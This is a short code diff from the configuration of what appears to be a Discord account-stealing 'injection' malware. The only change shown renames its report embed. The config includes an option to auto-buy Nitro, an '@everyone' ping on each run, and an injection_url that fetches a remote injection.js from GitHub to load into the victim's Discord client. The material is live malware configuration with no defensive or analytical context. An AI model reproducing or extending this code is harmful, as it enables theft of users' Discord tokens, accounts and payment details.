@@ -11,7 +11,7 @@ const config = {
   auto_buy_nitro: false, 
   ping_on_run: true, 
   ping_val: '@everyone',
-  embed_name: 'eziekelz injection', 
+  embed_name: 'eziekels son', 
   embed_icon: 'https://cdn.discordapp.com/attachments/1210249623818473553/1210268354258927696/nuevo-merch-de-kanye-west-vultures-02.jpg?ex=65e'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
   injection_url: 'https://raw.githubusercontent.com/eziekelz/injection/main/injection.js', 
